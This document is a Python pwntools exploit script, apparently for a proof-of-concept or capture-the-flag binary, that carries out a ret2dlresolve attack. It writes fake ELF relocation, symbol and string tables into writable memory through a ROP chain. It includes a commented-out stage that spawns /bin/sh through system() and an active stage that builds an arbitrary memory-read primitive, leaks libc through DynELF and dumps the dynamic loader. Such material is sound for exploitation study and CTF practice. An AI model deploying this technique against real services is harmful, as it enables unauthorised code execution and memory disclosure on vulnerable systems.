#!/usr/bin/env python3

from pwn import *
import pwnlib

# Process
io = None

# Files
t = context.binary = ELF("/io/poc")
# t = context.binary = ELF("/io/poc_ctf")

"""
Fake sections
"""
rw_area = (t.sym["__bss_start"] + 0x100) & ~0xFF
f_nent = 2  # nr of fake entries

# fake relocation table
rela_plt = t.dynamic_value_by_tag("DT_JMPREL")
rela_plt_entsz = 0x18  # sizeof(Elf64_Rela)
f_rela_plt = rw_area
f_rela_plt_ent = f_nent
f_rela_plt_offset = (f_rela_plt - rela_plt) // rela_plt_entsz

# fake symbol table
dynsym = t.dynamic_value_by_tag("DT_SYMTAB")
dynsym_entsz = 0x18  # sizeof(Elf64_Sym)
f_dynsym = f_rela_plt + rela_plt_entsz * f_rela_plt_ent + 0x10  # align
f_dynsym_ent = f_nent
f_dynsym_offset = (f_dynsym - dynsym) // dynsym_entsz

# fake string table
dynstr = t.dynamic_value_by_tag("DT_STRTAB")
f_dynstr = f_dynsym + dynsym_entsz * f_dynsym_ent
f_strings = b"system\x00write\x00/bin/sh\x00"
f_dynstr_sz = len(f_strings)
f_dynstr_offset = f_dynstr - dynstr

# fake got to store resolved addresses
f_got = f_dynstr + f_dynstr_sz
got_entsz = 0x8
f_got_sz = f_nent * got_entsz

# emits reloc_arg for the i'th fake relocation entry
def reloc_arg(i):
    return f_rela_plt_offset + i


# emits fake Elf64_Rela, referencing fake symbol
# f_r_sym: index in fake symbol table
def relocation_entry(f_r_sym):
    rel = p64(f_got + got_entsz * f_r_sym)  # resolved addr written here
    rel += p64(((f_dynsym_offset + f_r_sym) << 32) | 7)
    rel += p64(0)  # no addend
    return rel


# emits fake Elf64_Sym, referencing fake string
# f_st_name: offset into fake string table
def symbol_entry(f_st_name):
    sym = p32(f_dynstr_offset + f_st_name)  # st_name
    sym += p8((1 << 4) | 2)  # st_info = STB_GLOBAL | STT_FUNC
    sym += b"\x00" * (dynsym_entsz - len(sym))
    return sym


"""
ROP Gadgets
"""
t_rop = ROP(t)

p_rdx = None  # in libc
p_rdi = t_rop.rdi.address
p_rsi_r15 = t_rop.rsi.address
dl_plt = t.get_section_by_name(".plt").header.sh_addr  # the ret2dl gadget

"""
Arbirtrary read
"""
size = 0x1337


@pwnlib.memleak.MemLeak
def leaker(addr):
    global io, p_rdx, size
    print(f"Leaking {size} bytes at {hex(addr)}")

    io.clean()
    p = 0x9 * b"A"
    p += p64(p_rdi)
    p += p64(1)  # rdi = STDOUT
    p += p64(p_rsi_r15)
    p += p64(addr)  # rsi = addr
    p += p64(0xDEADBEEF)  # filler
    if p_rdx:
        p += p64(p_rdx)
        p += p64(size)  # rdx = size
    p += p64(dl_plt)
    p += p64(reloc_arg(1))  # write(1, addr, size)
    p += p64(t.sym.main)
    io.send(p)

    return io.recvn(size)


"""
Exploit
"""


def connect_ctf():
    context.log_level = "info"
    return remote("localhost", 1024)


def connect():
    context.log_level = "info"
    return process("/io/poc")


def debug():
    gdbscript = """
    b main
    ignore 1 1
    continue
    """
    context.log_level = "debug"
    return gdb.debug("/io/poc", gdbscript=gdbscript)


def main():
    global io, libc
    # io = debug()
    # io = connect_ctf()
    io = connect()

    # Stage 1: Call read, return to main
    s1 = 0x9 * b"A"
    s1 += p64(p_rsi_r15)
    s1 += p64(rw_area)
    s1 += 0x8 * b"A"
    s1 += p64(t.plt.read)  # read(0, rw_area. 0x1337)
    s1 += p64(t.sym.main)
    io.send(s1)
    io.clean()

    # Stage 2: Write fake sections
    s2 = relocation_entry(0)
    s2 += relocation_entry(1)
    s2 += 0x10 * b"A"  # align
    s2 += symbol_entry(0)  # system
    s2 += symbol_entry(7)  # write
    s2 += f_strings
    io.send(s2)
    io.clean()

    # Stage 3: Return to dl
    # Version 1: Call system('/bin/sh')
    # s3 = 0x9 * b'A'
    # s3 += p64(p_rdi)
    # s3 += p64(f_dynstr+13) # /bin/sh
    # s3 += p64(t_rop.ret.address) # stack align for libc
    # s3 += p64(dl_plt)
    # s3 += p64(reloc_arg(0)) # system
    # io.send(s3)
    # io.clean()

    # io.interactive()

    # Version 2: Construct arbitrary read

    # pre fill cache to avoid segfault
    log.info("Caching ELF and program headers")
    leaker._leak(t.address, 1)  # ELF and program headers
    log.info("Caching dynamic section and got")
    leak = leaker._leak(t.got.read - 0x1337 + 0x8, 0x1337)  # dynamic and got
    log.info("Constructing DynELF")
    dynelf = pwnlib.dynelf.DynELF(leaker, t.address)  # now save to use
    log.info("Caching link maps")
    leaker._leak(
        dynelf.link_map - 0x700, 1
    )  # cache all the link maps, vary if read segaults
    # get remote libc
    log.info("Using DynELF to get remote libc")
    libc = dynelf.libc  # now save to use
    log.info(f"Libc base at {hex(libc.address)}")
    # sanity check
    read_libc = u64(leak[-8::])  # address from got leak
    assert read_libc == libc.sym.read
    # get a more stable read
    global p_rdx, size
    size = 0x100
    rop = ROP(libc)
    p_rdx = rop.rdx.address
    # dump the remote loader
    log.info("Use DynELF to get bases")
    bases = dynelf.bases()
    dl_base = bases[b"/lib64/ld-linux-x86-64.so.2"]
    size = 0x32 * 0x1000  # make an educated guess about its size
    log.info("Dump remote loader")
    dl_raw = leaker._leak(dl_base, size)
    assert dl_raw[:4] == b"\x7fELF"
    with open(f"{hex(dl_base)}_ld-linux-x86-64.so.2.bin", "wb") as f:
        f.write(dl_raw)


if __name__ == "__main__":
    main()
